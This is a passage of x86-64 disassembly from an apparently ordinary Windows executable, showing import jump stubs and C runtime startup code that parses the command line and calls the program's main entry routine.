   140003398:	ff 25 ca 60 00 00    	jmp    *0x60ca(%rip)        # 0x140009468
   14000339e:	90                   	nop
   14000339f:	90                   	nop
   1400033a0:	ff 25 ba 60 00 00    	jmp    *0x60ba(%rip)        # 0x140009460
   1400033a6:	90                   	nop
   1400033a7:	90                   	nop
   1400033a8:	ff 25 aa 60 00 00    	jmp    *0x60aa(%rip)        # 0x140009458
   1400033ae:	90                   	nop
   1400033af:	90                   	nop
   1400033b0:	ff 25 9a 60 00 00    	jmp    *0x609a(%rip)        # 0x140009450
   1400033b6:	90                   	nop
   1400033b7:	90                   	nop
   1400033b8:	ff 25 8a 60 00 00    	jmp    *0x608a(%rip)        # 0x140009448
   1400033be:	90                   	nop
   1400033bf:	90                   	nop
   1400033c0:	ff 25 7a 60 00 00    	jmp    *0x607a(%rip)        # 0x140009440
   1400033c6:	90                   	nop
   1400033c7:	90                   	nop
   1400033c8:	ff 25 6a 60 00 00    	jmp    *0x606a(%rip)        # 0x140009438
   1400033ce:	90                   	nop
   1400033cf:	90                   	nop
   1400033d0:	ff 25 5a 60 00 00    	jmp    *0x605a(%rip)        # 0x140009430
   1400033d6:	90                   	nop
   1400033d7:	90                   	nop
   1400033d8:	ff 25 4a 60 00 00    	jmp    *0x604a(%rip)        # 0x140009428
   1400033de:	90                   	nop
   1400033df:	90                   	nop
   1400033e0:	ff 25 32 60 00 00    	jmp    *0x6032(%rip)        # 0x140009418
   1400033e6:	90                   	nop
   1400033e7:	90                   	nop
   1400033e8:	ff 25 22 60 00 00    	jmp    *0x6022(%rip)        # 0x140009410
   1400033ee:	90                   	nop
   1400033ef:	90                   	nop
   1400033f0:	ff 25 12 60 00 00    	jmp    *0x6012(%rip)        # 0x140009408
   1400033f6:	90                   	nop
   1400033f7:	90                   	nop
   1400033f8:	ff 25 02 60 00 00    	jmp    *0x6002(%rip)        # 0x140009400
   1400033fe:	90                   	nop
   1400033ff:	90                   	nop
   140003400:	ff 25 f2 5f 00 00    	jmp    *0x5ff2(%rip)        # 0x1400093f8
   140003406:	90                   	nop
   140003407:	90                   	nop
   140003408:	ff 25 e2 5f 00 00    	jmp    *0x5fe2(%rip)        # 0x1400093f0
   14000340e:	90                   	nop
   14000340f:	90                   	nop
   140003410:	57                   	push   %rdi
   140003411:	56                   	push   %rsi
   140003412:	53                   	push   %rbx
   140003413:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000341a:	31 f6                	xor    %esi,%esi
   14000341c:	e8 3f e9 ff ff       	call   0x140001d60
   140003421:	e8 2a fe ff ff       	call   0x140003250
   140003426:	48 8b 18             	mov    (%rax),%rbx
   140003429:	48 85 db             	test   %rbx,%rbx
   14000342c:	75 2d                	jne    0x14000345b
   14000342e:	e9 a6 00 00 00       	jmp    0x1400034d9
   140003433:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003438:	84 c9                	test   %cl,%cl
   14000343a:	74 54                	je     0x140003490
   14000343c:	83 e6 01             	and    $0x1,%esi
   14000343f:	74 2f                	je     0x140003470
   140003441:	be 01 00 00 00       	mov    $0x1,%esi
   140003446:	e8 85 fe ff ff       	call   0x1400032d0
   14000344b:	85 c0                	test   %eax,%eax
   14000344d:	74 08                	je     0x140003457
   14000344f:	80 7b 01 01          	cmpb   $0x1,0x1(%rbx)
   140003453:	48 83 db ff          	sbb    $0xffffffffffffffff,%rbx
   140003457:	48 83 c3 01          	add    $0x1,%rbx
   14000345b:	0f be 0b             	movsbl (%rbx),%ecx
   14000345e:	80 f9 20             	cmp    $0x20,%cl
   140003461:	7e d5                	jle    0x140003438
   140003463:	89 f0                	mov    %esi,%eax
   140003465:	83 f0 01             	xor    $0x1,%eax
   140003468:	80 f9 22             	cmp    $0x22,%cl
   14000346b:	0f 44 f0             	cmove  %eax,%esi
   14000346e:	eb d6                	jmp    0x140003446
   140003470:	84 c9                	test   %cl,%cl
   140003472:	74 1c                	je     0x140003490
   140003474:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000347b:	00 00 00 00 
   14000347f:	90                   	nop
   140003480:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
   140003484:	48 83 c3 01          	add    $0x1,%rbx
   140003488:	84 c0                	test   %al,%al
   14000348a:	74 04                	je     0x140003490
   14000348c:	3c 20                	cmp    $0x20,%al
   14000348e:	7e f0                	jle    0x140003480
   140003490:	31 c0                	xor    %eax,%eax
   140003492:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   140003497:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000349c:	f3 48 ab             	rep stos %rax,(%rdi)
   14000349f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400034a4:	ff 15 b6 5f 00 00    	call   *0x5fb6(%rip)        # 0x140009460
   1400034aa:	44 0f b7 4c 24 60    	movzwl 0x60(%rsp),%r9d
   1400034b0:	49 89 d8             	mov    %rbx,%r8
   1400034b3:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   1400034b8:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400034bd:	48 8b 0d 1c 20 00 00 	mov    0x201c(%rip),%rcx        # 0x1400054e0
   1400034c4:	44 0f 44 c8          	cmove  %eax,%r9d
   1400034c8:	31 d2                	xor    %edx,%edx
   1400034ca:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400034d1:	5b                   	pop    %rbx
   1400034d2:	5e                   	pop    %rsi
   1400034d3:	5f                   	pop    %rdi
   1400034d4:	e9 4f e6 ff ff       	jmp    0x140001b28
   1400034d9:	48 8d 1d 60 1c 00 00 	lea    0x1c60(%rip),%rbx        # 0x140005140
   1400034e0:	eb ae                	jmp    0x140003490
   1400034e2:	90                   	nop
   1400034e3:	90                   	nop
   1400034e4:	90                   	nop
   1400034e5:	90                   	nop
   1400034e6:	90                   	nop
   1400034e7:	90                   	nop
   1400034e8:	90                   	nop
   1400034e9:	90                   	nop
   1400034ea:	90                   	nop
   1400034eb:	90                   	nop
   1400034ec:	90                   	nop
   1400034ed:	90                   	nop
   1400034ee:	90                   	nop
   1400034ef:	90                   	nop
   1400034f0:	e9 4b df ff ff       	jmp    0x140001440
   1400034f5:	90                   	nop
   1400034f6:	90                   	nop
   1400034f7:	90                   	nop
   1400034f8:	90                   	nop
   1400034f9:	90                   	nop
   1400034fa:	90                   	nop
   1400034fb:	90                   	nop
   1400034fc:	90                   	nop
   1400034fd:	90                   	nop
   1400034fe:	90                   	nop
   1400034ff:	90                   	nop
